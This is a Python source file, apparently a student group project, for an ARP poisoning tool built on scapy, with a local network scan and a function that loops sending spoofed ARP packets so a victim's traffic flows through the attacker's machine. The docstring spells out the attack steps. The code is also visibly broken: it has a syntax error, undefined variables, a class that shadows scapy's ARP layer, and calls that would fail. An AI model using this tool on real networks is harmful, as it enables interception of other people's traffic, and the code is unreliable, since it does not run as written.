from scapy.all import *
#from scapy.all import Ether, ARP, get_if_addr, conf, sendp
import argparse
from time import sleep

"""
ARP poisoning is the act of altering the ARP table of another device on the network (for malicious purposes)

Steps to achieve ARP poisoning:
1. Choose victim machine on the same network
2. Get IP address of victim
3. Continuously send ARP packets (with arbitrary MAC-adress) using scapy to victim machine
4. Choosing the MAC-adress of the router will force the traffic, which usually goes from victim -> router, to flow from victim -> this machine

"""
# command line tool parser
parser = argparse.ArgumentParser(description="This program is an ARP poisoning tool")
args = parser.parse_args()

def print_banner():
    """
    Print some ASCII art for aesthetic purposes
    """
    banner="""
    _   ___ ___ ___ 
   /_\ | _ \ _ \ _ \\
  / _ \|   /  _/  _/
 /_/ \_\_|_\_| |_|  
                  By group 21  
    """
    print(banner)

class ARP(object):
    def __init__(self) -> None:
        selected_interface = None
    
    def _get_my_ip(self):
        my_ip = get_if_addr(conf.iface) # this is a string
        return my_ip
    
    def _get_my_mac(self):
        my_macs = [get_if_hwaddr(i) for i in get_if_list()]

    def _represents_int(self, i):
        try: 
            int(i)
        except ValueError:
            return False
        else:
            return True

    def print_menu(self):
        task_names = task_dict.keys()
        for i, task_name in enumerate(task_names, start=0):
            print("{}: {}".format(i, task_name))


    def get_ip_range(self, ip_range=None):
        if ip_range is None:
            ip_range = my_ip+"/24"
        return ip_range

    def get_network_users_ARPSCAN(self):
        """
        ARP ping scan
        """
        ip_range = get_ip_range()
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range) #dst="ff:ff:..." means all devices on the network will receive this packet.
        print("Scanning devices connected to network, please wait...")
        network_devices = srp(request, timeout=10, verbose=0)[0] # sr is send receive command, srp for L2 packet, add 1 at the end for waiting for 1 packet only.
        for i, user in enumerate(network_devices, start=1):
            #print(f"{i}: {user}\n")
            print("{}          {}".format(user[1].psrc, user[1].hwsrc))
        if network_devices is []:
            print("No network devices found\n")
        
def ARP_poison(macAttacker, ipAttacker, macVictim, ipVictim, ipToSpoof):
    """
    Victim's arp table will contain the entry
    ----------
    ...
    ipToSpoof at macAttacker
    ...
    ----------

    Args:
        macAttacker (str): _description_
        ipAttacker (str): _description_
        macVictim (str): _description_
        ipVictim (str): _description_
        ipToSpoof (str): _description_
    """
    if machine1_ip is None:
        machine1_ip = input("machine1_ip >>")
    if machine2_ip is None:
        machine2_ip = input("machine2_ip >>")
    if machine1_mac is None:
        machine1_mac = input("machine1_mac >>")
    if machine2_mac is None:
        machine2_mac = input("machine2_mac >>")
    
    data = dict{"macAttacker":macAttacker, "ipAttacker":ipAttacker, "macVictim":macVictim, "ipVictim":ipVictim, "ipToSpoof":ipToSpoof}
    for i, (var_name, var) in enumerate(data.items()):
        if var is None:
            data[var_name] = input("{}>>".format(var_name))
            
    
    pkt = Ether() / ARP()
    pkt[Ether].src = macAttacker
    pkt[ARP].hwsrc = macAttacker
    pkt[ARP].psrc  = ipToSpoof
    pkt[ARP].hwdst = macVictim
    pkt[ARP].pdst  = ipVictim
        
    while True:
        sendp( pkt )
        sleep(5)


def parse_command(command):
    if command == "":
        pass
    elif represents_int(command):
        command = int(command)
        try:
            task_name = task_dict.keys()[command]
            task = task_dict[task_name]
            task()
        except IndexError:
            print("Command not found")
    else:
        try:
            task = task_dict[command]
            task()
        except:
            print("Command not found")

def CLI():
    command = str(input(">>"))
    parse_command(command=command)

task_dict = {"Help":parser.print_help,\
        "Scan local network for users":get_network_users_ARPSCAN,\
        "ARP poison":ARP_poison,\
        "exit":quit}

def main():
    print_banner()
    print_menu()
    while True:
        CLI()
    

if __name__=="__main__":
    main()